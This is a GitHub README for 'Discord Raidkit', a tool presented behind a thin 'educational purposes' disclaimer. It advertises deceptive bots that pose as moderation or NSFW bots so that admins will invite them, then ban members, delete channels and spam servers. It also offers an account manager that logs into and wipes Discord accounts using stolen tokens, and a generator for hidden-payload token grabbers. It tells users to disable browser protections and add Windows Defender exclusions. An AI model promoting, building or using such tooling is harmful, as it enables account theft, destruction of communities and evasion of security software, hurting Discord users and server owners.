# Discord Raidkit
⚠️ **For educational purposes!** 📖

This program has been created for educational purposes, highlighting the dangers of social engineering.

**By using this program, you agree that I am in no way responsible for your usage of this program.**

---

![forthebadge](https://forthebadge.com/images/badges/made-with-python.svg)
![forthebadge](http://forthebadge.com/images/badges/built-with-love.svg)

![GitHub contributors](https://img.shields.io/github/contributors/the-cult-of-integral/discord-raidkit)
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=shields)](http://makeapullrequest.com)
![GitHub issues](https://img.shields.io/github/issues/the-cult-of-integral/discord-raidkit)
![GitHub pull requests](https://img.shields.io/github/issues-pr/9P9/Discord-QR-Token-Logger)
![Maintenance](https://img.shields.io/maintenance/yes/2023)
![GitHub commit activity](https://img.shields.io/github/commit-activity/m/the-cult-of-integral/discord-raidkit)

Discord Raidkit is an open-source, forever free tool that allows you to raid and destroy Discord servers via Discord bots, compromise Discord accounts, and generate Discord token grabbers.

[Have a feature suggestion? Make one here!](https://github.com/the-cult-of-integral/discord-raidkit/discussions/categories/ideas)

![Discord Raidkit v2.4.2 Console](https://user-images.githubusercontent.com/98130822/235321378-f624a5ba-5ff6-4f80-b37e-8a1691724c53.png)

## Tools

- **Anubis** is a Discord bot with [nine malicious commands](#malicious-bot-commands). However, unlike other nuking tools, Anubis also has several non-malicious slash commands, including a moderation suite, to help you convince server administration to add the bot.

- **Qetesh** is a Discord bot with [nine malicious commands](#malicious-bot-commands). However, Qetesh also has 25 NSFW slash commands for the most popular pornographic kinks, at least according to PornHub. These commands should help take advantage of the degeneracy of Discord users.

- **Osiris** is the account manager of Discord Raidkit. Using Osiris, you can save the information of an account, login to an account using either Chrome, Firefox, or Microsoft Edge, or you can fully nuke an account, deleting channels, guilds, friends, and connections, deauthorizing applications, removing hype squad, and PATCHing various account settings. You can also generate Discord token grabbers within Windows Registry support. As of v2.4.2, Osiris supports proxies (**proxies currently beta; awaiting feedback**).
 
Remember, if you need help setting these tools, you can always visit the [Discord Raidkit Wiki](https://github.com/the-cult-of-integral/discord-raidkit/wiki)!
 
## Installation

1. Head over to [the latest release](https://github.com/the-cult-of-integral/discord-raidkit/releases/latest).
2. Download the EXE zip.
3. Extract and run the executable in its directory.

---

## Malicious bot commands

|Command|Aliases|Parameters|Brief Description|
|-|-|-|-|
| nick_all | nick, nickall | *nickname* | Nickname every user in a server to *nickname*. |
| msg_all | msg, msgall | *message* | Send a *message* as a DM to every user in a server.  |
| spam | --- | *message* | Send a *message* to every text channel in a server, repeatedly. |
| cpurge | --- | --- | Delete every channel in a server. |
| cflood | --- | *amount*, *name* | Create an *amount* of text channels with a given *name* in a server. |
| raid | --- | *role name*, *nickname*, *amount*, *name*, *message* | Create and give every user in a server a role named *role name*, nickname every user in a server to *nickname*, delete every channel in a server, create an *amount* of text channels named *name* in a server, and then send a *message* to every text channel in a server, repeatedly.
| admin | --- | *member*, *role name* | Grant a *member* in a server an all-permissions role named *role name*. |
| nuke | --- | --- | Ban all members from a server, delete every channel in a server, delete every role in a server, delete every emoji in a server, delete every sticker from a server, revoke every invite from a server, then edit a server's settings. |
| mass_nuke | massnuke, nuke_all, nukeall | --- | Perform the nuke command on every server the bot is in, one by one. |
| leave | --- | --- | Leave a server. |
| mass_leave | massleave, leave_all, leaveall | --- | Leave every server. |
| close | --- | --- | Close a bot and return to the main menu. |

## Osiris actions

|Action|Brief Description|
|-|-|
| Generate Discord token grabber | Allows you to generate a Discord token grabber via a folder name, a seen payload name, and a hidden payload name. |
| Get a Discord account's details | Allows you view information on a Discord account, such as its email, phone, and billing address. |
| Log into a Discord account | Allows you to log into a Discord account using either Chrome, Firefox, or Microsoft Edge. |
| Nuke a Discord account | Deletes servers, friends, channels, and connections, deauthorizes apps, leaves hype squad and patches settings. |

---

## Known issues as of latest release

- [**Osiris Login does not work.**](https://github.com/the-cult-of-integral/discord-raidkit/issues/79) Osiris' login functionality does not currently work due to change made to the `Selenium` module in v4.10.0. I am aware of this, and will be releasing v2.4.3 shortly.

- Anti-malware will often detect Osiris as malware, as Osiris gives you the ability to generate token grabbers. As a result, some people may have issues downloading the executable, as their browser and other anti-malware software may block it. This issue can be resolved by temporaily disabling these browser features, as well as temporarily adding the downloads folder to Windows Defender exclusions. Once you have the executable, set up some folder to be permanently excluded from Windows Defender, and place the executable in said folder. **Make sure to not place anything you do not trust in this folder** - be internet safe! *This issue is more prevelent on Windows.*

---

<p align="left">
  <strong>Views</strong> (as of 24/09/2022)<br><br>
  <img src="https://profile-counter.glitch.me/discord-raidkit/count.svg" />
</p>

---

## v3.0.0 coming soon?

If you're wondering where I have been the past few months, I've been learning more front-end development. Here's a little screenshot of a secret, little thing I've been working on. Due to the way discord.py works, I can't promise I'll be able to create a fully functional web version of Discord Raidkit, but you never know! No promises though!

#### Overview...

![overview-preview](https://github.com/the-cult-of-integral/discord-raidkit/assets/98130822/4911d58d-815e-4d38-925c-dd342bfe9070)

#### Bots...

![bots-preview](https://github.com/the-cult-of-integral/discord-raidkit/assets/98130822/beead659-79fd-471d-937b-f5c8151d366a)
